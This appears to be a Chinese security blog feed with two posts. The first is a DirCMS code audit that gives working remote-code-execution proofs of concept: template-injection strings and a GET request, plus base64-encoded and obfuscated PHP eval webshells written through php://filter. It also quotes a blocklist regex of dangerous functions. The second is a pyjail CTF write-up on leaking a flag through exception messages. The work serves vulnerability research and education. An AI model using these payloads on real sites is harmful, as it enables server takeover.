<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">s</span><span class="o">=</span><span class="n">api</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">api</span><span class="o">&amp;</span><span class="n">m</span><span class="o">=</span><span class="n">template</span><span class="o">&amp;</span><span class="n">app</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=</span><span class="n">list_data</span><span class="mf">.</span><span class="n">html</span><span class="o">&amp;</span><span class="n">phpcmf_dir</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">catid</span><span class="o">=%</span><span class="mi">20</span><span class="n">action</span><span class="o">=</span><span class="k">function</span><span class="o">%</span><span class="mi">20</span><span class="n">name</span><span class="o">=</span><span class="n">phpinfo</span><span class="o">%</span><span class="mi">20</span><span class="n">param0</span><span class="o">=-</span><span class="mi">1</span>
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230809040203.png" alt="20230809040203" /></p>

<p>这个漏洞的利用思路来自于文章 <a href="https://xz.aliyun.com/t/10002">某cms 前台RCE漏洞分析 - 先知社区</a>，通过变量覆盖控制模板变量来达成 RCE，不得不说十分巧妙。</p>

<h2 id="总结">总结</h2>
<ol>
  <li>模板解析功能是提高 php CMS 框架灵活性的重要功能，但同样意味着容易出现可利用的点，例如，后台修改模板、利用变量覆盖控制控制模板变量等利用方式。</li>
  <li>缓存文件通常会在程序中被包含进来，一旦缓存文件的内容可控，就可能造成严重的影响。</li>
</ol>

<h1 id="参考资料">参考资料</h1>
<ul>
  <li><a href="https://xz.aliyun.com/t/11457">某CMS漏洞总结 - 先知社区</a></li>
  <li><a href="https://xz.aliyun.com/t/10002">某cms 前台RCE漏洞分析 - 先知社区</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="code audit" /><category term="CMS" /><summary type="html"><![CDATA[DirCMS 审计 环境搭建 官网链接：http://www.dircms.cc/ 下载地址：dircms6 目录结构 代码目录结构 . ├── admin.php ├── api ├── cache ├── config ├── dircms ├── favicon.ico ├── index.php ├── install.php ├── LICENSE ├── mobile ├── nginx.htaccess ├── README.en.md ├── README.md ├── static ├── template ├── test.php └── uploadfile dircms 为框架内核文件，基于迅睿 CMS 框架：迅睿CMS框架 MVC 结构 控制器：功能相关控制器存放在 dircms/App 目录下 服务类（Service）：存放在 dircms/Fcms/Core/Service.php 基础类：存放在 dircms/Fcms/Library 目录下 数据流：控制器 -&gt; 服务类 Service -&gt; 类加载（加载基础类） API pay ueditor 安全防护 dircms/Fcms/Library/Security.php 存在 XSS 过滤函数 xss_clean，其中除了 xss 过滤之外，还有部分的 php 函数过滤。 $str = preg_replace( '#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', '\\1\\2&amp;#40;\\3&amp;#41;', $str ); 漏洞挖掘 后台代码执行（模板解析导致 RCE） dircms/Fcms/Core/Helper.php 中存在一个 php55_replace_function 函数： function php55_replace_function($value) { if (function_exists($value[1])) { // 执行函数体 $param = $value[2] == '$data' ? $this-&gt;data : $value[2]; return call_user_func_array( $value[1], is_array($param) ? ['data' =&gt; $param] : @explode(',', $param) ); } else { return '函数['.$value[1].']未定义'; } return $value[0]; } 该函数调用了 call_user_func_array 函数，一旦传入的参数 $value 可控，则可以执行任意 php 函数。 php55_replace_function 函数调用点较多，其中 dircms/Fcms/Library/Seo.php 中的 search 函数也用到了该方法，部分代码如下： $rep = new \php5replace($data); ... $seo['meta_title'] = str_replace('%', '', preg_replace_callback('#{([a-z_0-9]+)\((.*)\)}#Ui', array($rep, 'php55_replace_function'), $seo['meta_title'])); ... 使用正则表达式匹配 $seo['meta_title']) 的值，匹配内容包含整个函数调用。但是这里的执行也有一定限制： 函数名只能匹配小写字母、数字与下划线。 无法嵌套函数调用。 $seo['meta_title'])来源于后台 SEO 设置，在”设置”-&gt; SEO 设置 -&gt; 搜索 SEO 中可以设置 SEO 标题，在其中的内容中添加一个函数调用： [第{page}页{join}][{keyword}{join}][{param}{join}]{modulename}{join}{SITE_NAME}{phpinfo(1)} 保存之后，再在前端访问搜索页面: /index.php?s=news&amp;c=search&amp;keyword=1111 当尝试使用 system 执行命令时，会发现输入的 system() 中的括号会被 html 转义，其过滤函数可以定位到 dircms/Fcms/Library/Security.php 中的 xss_clean 函数，该函数除了会进行 XSS 的过滤，还会进行 PHP 标签 &lt;? 以及敏感函数的过滤，如下所示： $str = preg_replace( '#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', '\\1\\2&amp;#40;\\3&amp;#41;', $str ); 其中过滤了常见的一些命令执行函数，但并不完全，综合来看，我们需要找到满足下面条件的函数去执行命令： 不在黑名单内。 不能嵌套函数。 例如，我们可以使用 file_put_content 结合 php://filter 来写入文件，例如： file_put_contents("php://filter/write=convert.base64-decode/resource=evil.php","PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg=="); poc 如下： [第{page}页{join}][{keyword}{join}][{param}{join}]{modulename}{join}{SITE_NAME}{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg==)} 前台代码执行（模板解析导致 RCE） 这个前台的 RCE 与上面的后台 RCE sink 点一致，都是利用 php55_replace_function 函数。 搜索 php55_replace_function 的调用点，主要出现在 dircms/Fcms/Library/Seo.php 和 dircms/Fcms/Library/Router.php 两个文件中。 Seo 类中的三个函数都有调用： dircms/Fcms/Library/Seo.php - Seo 类 - category 函数 - search 函数 - show 函数 其中，search 函数用于前端查询窗口，上面的后台 RCE 就是需要通过这个函数来触发，但此处的 payload 需要依赖后台数据修改。 show 函数用于文章的展示，查看某一篇文章时就会调用，部分代码如下： function show($mod, $data, $page = 1) { ... $meta_title = $mod['site'][SITE_ID]['show_title'] ? $mod['site'][SITE_ID]['show_title'] : '['.dr_lang('第%s页', '{page}').'{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}'; $meta_title = $page &gt; 1 ? str_replace(array('[', ']'), '', $meta_title) : preg_replace('/\[.+\]/U', '', $meta_title); $rep = new \php5replace($data); $seo['meta_title'] = preg_replace_callback('#{([A-Z_]+)}#U', array($rep, 'php55_replace_var'), $meta_title); $seo['meta_title'] = preg_replace_callback('#{([a-z_0-9]+)}#U', array($rep, 'php55_replace_data'), $seo['meta_title']); $seo['meta_title'] = preg_replace_callback('#{([a-z_0-9]+)\((.*)\)}#Ui', array($rep, 'php55_replace_function'), $seo['meta_title']); $seo['meta_title'] = str_replace($data['join'].$data['join'], $data['join'], $seo['meta_title']); $seo['meta_title'] = htmlspecialchars(dr_clearhtml($seo['meta_title'])); ... } 可以看到其中用到了 {join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME} 这个模板，也就是说，在经过 php55_replace_data 函数时，就会使用文章实际的标题来替换 {title}。 但需要注意的是，这段代码调用完 php55_replace_data 之后，继续调用 php55_replace_function，如果我们将 title 填充为 {file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,base64_content)}，就可以进入 php55_replace_function 的调用。 因此，只需要创建一篇文章，将标题填充为上述的 payload 即可，如果站点开启了注册，我们就可以直接创建一个普通用户，然后创建一篇文章就可以 RCE。 poc: {file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==)} 创建完之后在前台查看该文章就可以触发。 后台代码注入（缓存文件利用） 参考这篇文章 某CMS漏洞总结 - 先知社区，该漏洞出现在迅睿 CMS 框架版本 v4.3.3～v4.5.0，DirCMS 中没有明确标识版本，但根据代码逻辑判断属于该版本区间。 dircms/Core/Controllers/Admin/Cron.php 中的 add 函数会将用户输入写入缓存文件，并且每次访问时对缓存文件进行包含，由此造成代码注入，add 函数的代码如下： public function add() { $json = ''; if (is_file(WRITEPATH.'config/cron.php')) { require WRITEPATH.'config/cron.php'; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \Phpcmf\Service::L('input')-&gt;post('data', true); file_put_contents(WRITEPATH.'config/cron.php', '&lt;?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';'); \Phpcmf\Service::L('input')-&gt;system_log('设置自定义任务类型'); $this-&gt;_json(1, dr_lang('操作成功')); } \Phpcmf\Service::V()-&gt;assign([ 'data' =&gt; $data, ]); \Phpcmf\Service::V()-&gt;display('cron_add.html'); } 触发 add 函数的调用需要进入管理员后台 -&gt; 应用 -&gt; 应用插件 -&gt; 任务队列。 点击保存可以提交 post 报文，data 参数经过 json_encode 最终会写入 cache/config/cron.php ';file_put_contents(implode(base64_decode('Lw=='),['php:','','filter','write=convert.base64-decode','resource=evil.php']),'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==');return;$a=' 最终写入 cache/config/cron.php 文件内容如下： &lt;?php defined('FCPATH') OR exit('No direct script access allowed'); $json='{"1":{"name":"';file_put_contents(implode(base64_decode('Lw=='),['php:','','filter','write=convert.base64-decode','resource=evil.php']),'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==');return;$a='"}}'; 也参考这篇文章 某CMS漏洞总结 - 先知社区 中的 poc: isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data[1][name]=&amp;data[1][code]=[';file_put_contents('webshell.php',htmlspecialchars_decode('&lt;').'?php eval'.base64_decode('KA==').'@$_POST['.base64_decode('Ig==').'password'.base64_decode('Ig==').']'.base64_decode('KQ==').';?'.htmlspecialchars_decode('&gt;'));return;'] 前台代码执行（变量覆盖导致模板变量可控） dircms/Fcms/Core/View.php 中的 list_tag 函数中存在这样的代码： // list 标签解析 public function list_tag($_params) { ... switch ($system['action']) { case 'function': //执行函数 if (!isset($param['name'])) { return $this-&gt;_return($system['return'], 'name参数不存在'); } elseif (!function_exists($param['name'])) { return $this-&gt;_return($system['return'], '函数['.$param['name'].']未定义'); } $name = 'function-'.md5(dr_array2string($param)); $cache = \Phpcmf\Service::L('cache')-&gt;init()-&gt;get($name); if (!$cache) { $rt = call_user_func($param['name'], $param['param']); $cache = [ $rt ]; \Phpcmf\Service::L('cache')-&gt;init()-&gt;save($name, $cache, $system['cache']); } return $this-&gt;_return($system['return'], $cache, ''); break; 当 action 为字符串 function 时，会调用 call_user_func($param['name'], $param['param']) 执行函数。如果函数名与函数参数可控，则可以造成任意代码执行。 list_tag 函数在大量的模板文件中被调用，例如：cache/template/template_pc_default_home_api_list_data.html.cache.php。该文件是 template/pc/default/home/api/list_data.html 经过解析之后生成的 php 缓存文件。 当需要使用 list_data.html 这个前端文件时，就会将 cache/template/template_pc_default_home_api_list_data.html.cache.php 这个缓存文件包含进来。 该缓存文件的部分内容如下所示： &lt;?php $list_return = $this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300"); if ($list_return) extract($list_return, EXTR_OVERWRITE); $count=dr_count($return); if (is_array($return)) { foreach ($return as $key=&gt;$t) { $is_first=$key==0 ? 1 : 0;$is_last=$count==$key+1 ? 1 : 0; ?&gt; &lt;div class="ajax-load-con content excerpt-one"&gt; &lt;div class="content-box posts-image-box"&gt; &lt;div class="posts-default-title"&gt; &lt;div class="post-entry-categories"&gt; 其中会调用 list_tag 函数，且传入参数 action=module module=news catid=$catid page=1 cache=300。可以看到参数是通过空格进行分割的键值对，list_tag 函数在进行处理时，会将键值对保存在 $system 这个变量中： foreach ($params as $t) { ... if (isset($system[$var])) { // 系统参数，只能出现一次，不能添加修饰符 $system[$var] = dr_safe_replace($val); } 例如第一个参数 action： $system['action'] = dr_safe_replace('module') 想要进入 call_user_func，就需要 action 的值为 function。但在内置的所有模板中，没有模板使用到了 action=function。 但需要注意的是，list_tag 在调用时 $this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300");，使用到了一个 $catid 变量。由于这个变量被直接拼接进来，假如构造 $catid = " action=function name=phpinfo param0=-1" 最终传入 list_tag 的参数就会变成： $this-&gt;list_tag("action=module module=news catid= action=function name=phpinfo param0=-1 page=1 cache=300"); action 参数被设置了两次，但最终会都被设置为后者的值，这样也就达到了目的。 $catid 在哪被赋值呢？模板文件实际上是在 dircms/Fcms/Core/View.php 中的 display 函数中使用 include 包含进来的，在这个 include 的前方，正好调用了一次 extract 函数。 public function display($_name, $_dir = '') { if (!isset($this-&gt;_options['get'])) { $this-&gt;_options['get'] = \Phpcmf\Service::L('input')-&gt;xss_clean($_GET); } ... extract($this-&gt;_options, EXTR_PREFIX_SAME, 'data'); ... include $this-&gt;load_view_file($_view_file); ... } extract 函数可以造成变量覆盖，如果 $this-&gt;_options可控的话，就可以对 $catid 赋值。向上溯源可以发现根多地方都有调用 display 函数，但只有 dircms/Core/Controllers/Api/Api.php 中的 template 函数最方便利用： public function template() { $file = dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('name')); $module = dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('module')); $data = [ 'file' =&gt; $file, 'module' =&gt; $module, ]; ... \Phpcmf\Service::V()-&gt;assign(\Phpcmf\Service::L('input')-&gt;get('', true)); ob_start(); \Phpcmf\Service::V()-&gt;display($file); $html = ob_get_contents(); ob_clean(); ... } 直接调用 \Phpcmf\Service::V()-&gt;assign 函数并传入所有 GET 请求参数。\Phpcmf\Service::V()-&gt;assign 函数就是用于给 option 成员变量赋值的，如下所示： public function assign($key, $value = '') { if (!$key) { return FALSE; } if (is_array($key)) { foreach ($key as $k =&gt; $v) { $this-&gt;_options[$k] = $v; } } else { $this-&gt;_options[$key] = $value; } } 由此一来从 GET 请求参数中传入即可。poc 如下： /index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=list_data.html&amp;phpcmf_dir=admin&amp;catid=%20action=function%20name=phpinfo%20param0=-1 这个漏洞的利用思路来自于文章 某cms 前台RCE漏洞分析 - 先知社区，通过变量覆盖控制模板变量来达成 RCE，不得不说十分巧妙。 总结 模板解析功能是提高 php CMS 框架灵活性的重要功能，但同样意味着容易出现可利用的点，例如，后台修改模板、利用变量覆盖控制控制模板变量等利用方式。 缓存文件通常会在程序中被包含进来，一旦缓存文件的内容可控，就可能造成严重的影响。 参考资料 某CMS漏洞总结 - 先知社区 某cms 前台RCE漏洞分析 - 先知社区]]></summary></entry><entry><title type="html">pyjail bypass-09 绕过输出限制</title><link href="/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6.html" rel="alternate" type="text/html" title="pyjail bypass-09 绕过输出限制" /><published>2023-08-03T18:23:57+08:00</published><updated>2023-08-03T18:23:57+08:00</updated><id>/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6</id><content type="html" xml:base="/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6.html"><![CDATA[<h1 id="pyjail-没有输出的场景">PyJail 没有输出的场景</h1>
<p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>

<p>以 AmateursCTF 2023 的一道题目为例，题目的源码如下：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/local/bin/python
</span><span class="kn">from</span> <span class="n">flag</span> <span class="kn">import</span> <span class="n">flag</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">[</span><span class="n">flag</span><span class="p">]:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">code</span> <span class="o">=</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Give code: </span><span class="sh">"</span><span class="p">))</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">e</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span> <span class="ow">or</span> <span class="sh">"</span><span class="s">t</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span> <span class="ow">or</span> <span class="sh">"</span><span class="se">\\</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">invalid input</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">exec</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
</code></pre></div></div>

<p>在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。</p>

<p>注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。</p>

<h1 id="利用异常处理">利用异常处理</h1>
<p>作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为：</p>
<ul>
  <li>KeyError（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</li>
  <li>FileNotFoundError（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</li>
  <li>ValueError（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</li>
</ul>

<p>这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。</p>

<h2 id="keyerror">KeyError</h2>
<p>KeyError 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入：</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Give</span> <span class="n">code</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">}[</span><span class="n">_</span><span class="p">]</span>
<span class="sh">'</span><span class="s">flag{xxxx}</span><span class="sh">'</span>
</code></pre></div></div>

<h2 id="filenotfounderror">FileNotFoundError</h2>
<p>FileNotFoundError 出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>

<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Give</span> <span class="n">code</span><span class="p">:</span> <span class="nf">open</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
<span class="p">[</span><span class="n">Errno</span> <span class="mi">2</span><span class="p">]</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="p">:</span> <span class="sh">'</span><span class="s">flag{xxxx}</span><span class="sh">'</span>
</code></pre></div></div>

<h2 id="valueerror">ValueError</h2>
<p>ValueError 比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Give</span> <span class="n">code</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
<span class="nb">ValueError</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">literal</span> <span class="k">for</span> <span class="nf">int</span><span class="p">()</span> <span class="k">with</span> <span class="n">base</span> <span class="mi">10</span><span class="p">:</span> <span class="sh">'</span><span class="s">flag{xxxx}</span><span class="sh">'</span>
</code></pre></div></div>

<p>当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。</p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://github.com/daffainfo/ctf-writeup/tree/main/AmateursCTF%202023/Censorship">ctf-writeup/AmateursCTF 2023/Censorship at main · daffainfo/ctf-writeup</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Python" /><category term="pyjail" /><summary type="html"><![CDATA[PyJail 没有输出的场景 在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。 以 AmateursCTF 2023 的一道题目为例，题目的源码如下： #!/usr/local/bin/python from flag import flag for _ in [flag]: while True: try: code = ascii(input("Give code: ")) if "flag" in code or "e" in code or "t" in code or "\\" in code: raise ValueError("invalid input") exec(eval(code)) except Exception as err: print(err) 在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。 注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。 利用异常处理 作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为： KeyError（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用） FileNotFoundError（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。 ValueError（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。 这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。 KeyError KeyError 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入： Give code: {"1":"2"}[_] 'flag{xxxx}' FileNotFoundError FileNotFoundError 出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。 但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。 Give code: open(_) [Errno 2] No such file or directory: 'flag{xxxx}' ValueError ValueError 比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如： Give code: int(_) ValueError: invalid literal for int() with base 10: 'flag{xxxx}' 当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。 参考 ctf-writeup/AmateursCTF 2023/Censorship at main · daffainfo/ctf-writeup]]></summary></entry></feed>